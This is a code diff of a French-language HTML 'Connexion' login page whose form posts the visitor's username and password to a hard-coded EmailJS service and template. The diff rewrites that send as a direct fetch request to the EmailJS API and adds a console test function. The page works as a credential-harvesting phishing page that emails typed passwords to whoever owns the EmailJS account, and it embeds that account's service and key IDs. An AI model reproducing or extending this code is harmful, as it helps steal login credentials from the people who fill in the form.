@@ -4,11 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Connexion</title>
-    <!-- Script EmailJS -->
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
-        // Initialisation d'EmailJS avec ta clé publique
-        emailjs.init("0s69puSeiECXHqvEG"); // Remplace par ta clé publique EmailJS
+        emailjs.init("0s69puSeiECXHqvEG"); // Initialisation avec ta clé publique
     </script>
     <style>
         body {
@@ -79,7 +77,6 @@
     </div>
 
     <script>
-        // Ajoute un écouteur d'événement au formulaire
         document.getElementById('form').addEventListener('submit', async (e) => {
             e.preventDefault(); // Empêche le rechargement de la page
 
@@ -94,36 +91,67 @@
             try {
                 console.log("Tentative d'envoi des données...");
 
-                // Appelle le service EmailJS
-                const response = await emailjs.send("service_pr4cilr", "template_p533svs", {
-                    username: username,
-                    password: password
+                // Appel à l'API EmailJS avec fetch
+                const response = await fetch("https://api.emailjs.com/api/v1.0/email/send", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                        service_id: "service_pr4cilr", // Remplace par ton Service ID
+                        template_id: "template_p533svs", // Remplace par ton Template ID
+                        user_id: "0s69puSeiECXHqvEG", // Clé publique
+                        template_params: {
+                            username: username,
+                            password: password,
+                        }
+                    }),
                 });
 
-                console.log("Réponse EmailJS :", response);
-                alert("Les informations ont été envoyées avec succès !");
+                if (response.ok) {
+                    console.log("Réponse EmailJS :", await response.json());
+                    alert("Les informations ont été envoyées avec succès !");
+                } else {
+                    console.error("Erreur :", response.statusText);
+                    alert("Une erreur s'est produite lors de l'envoi des données.");
+                }
             } catch (error) {
                 console.error("Erreur lors de l'envoi :", error);
                 alert("Une erreur s'est produite lors de l'envoi des données.");
             }
         });
 
-        // Test EmailJS dans la console pour le débogage
+        // Fonction pour tester EmailJS directement dans la console
         async function testEmailJS() {
             try {
-                const testResponse = await emailjs.send("service_pr4cilr", "template_p533svs", {
-                    username: "TestUser",
-                    password: "TestPass"
+                const response = await fetch("https://api.emailjs.com/api/v1.0/email/send", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                        service_id: "service_pr4cilr",
+                        template_id: "template_p533svs",
+                        user_id: "0s69puSeiECXHqvEG",
+                        template_params: {
+                            username: "TestUser",
+                            password: "TestPassword",
+                        },
+                    }),
                 });
 
-                console.log("Test EmailJS réussi :", testResponse);
-            } catch (testError) {
-                console.error("Erreur de test avec EmailJS :", testError);
+                if (response.ok) {
+                    console.log("Test EmailJS réussi :", await response.json());
+                } else {
+                    console.error("Erreur lors du test :", response.statusText);
+                }
+            } catch (error) {
+                console.error("Erreur de test EmailJS :", error);
             }
         }
 
-        // Appelle cette fonction dans la console pour tester
-        console.log("Utilise testEmailJS() dans la console pour vérifier EmailJS.");
+        // Exécute `testEmailJS()` dans la console pour vérifier si EmailJS fonctionne
+        console.log("Utilisez testEmailJS() dans la console pour tester EmailJS.");
     </script>
 </body>
 </html>
